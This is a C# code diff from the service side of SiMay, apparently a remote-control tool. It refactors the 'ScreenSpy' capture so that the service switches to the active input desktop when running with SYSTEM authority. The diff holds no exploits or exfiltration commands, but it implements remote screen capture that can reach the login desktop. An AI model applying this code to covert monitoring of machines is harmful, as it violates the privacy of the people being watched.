@@ -30,6 +30,7 @@ namespace SiMay.ServiceCore.ApplicationService
     {
 
         private int _bscanmode = 1; //0逐行 1差异
+        private bool _hasSystemAuthor = AppConfiguartion.HasSystemAuthority.Equals("true", StringComparison.OrdinalIgnoreCase);
         private ScreenSpy _spy;
         private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
         public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
@@ -63,13 +64,7 @@ namespace SiMay.ServiceCore.ApplicationService
                     OriginName = Environment.MachineName + "@" + (AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo)
                 });
 
-            ICapturer capturer;
-            if (AppConfiguartion.HasSystemAuthority.Equals("true", StringComparison.OrdinalIgnoreCase))
-                capturer = new SwitchDesktopBitBltCapture();
-            else
-                capturer = new BitBltCapture();
-
-            _spy = new ScreenSpy(capturer);
+            _spy = new ScreenSpy(new BitBltCapture(true));
             _spy.OnDifferencesNotice += ScreenDifferences_OnDifferencesNotice;
         }
 
@@ -145,6 +140,9 @@ namespace SiMay.ServiceCore.ApplicationService
             var rect = session.CompletedBuffer.GetMessageEntity<ScreenHotRectanglePack>();
             //根据监控模式使用热区域扫描
             bool ishotRegtionScan = rect.CtrlMode == 1 ? true : false;
+
+            if (_hasSystemAuthor)
+                Win32Interop.SwitchToInputDesktop();
 
             if (_bscanmode == 0)
                 _spy.FindDifferences(ishotRegtionScan, new Rectangle(rect.X, rect.Y, rect.Width, rect.Height));
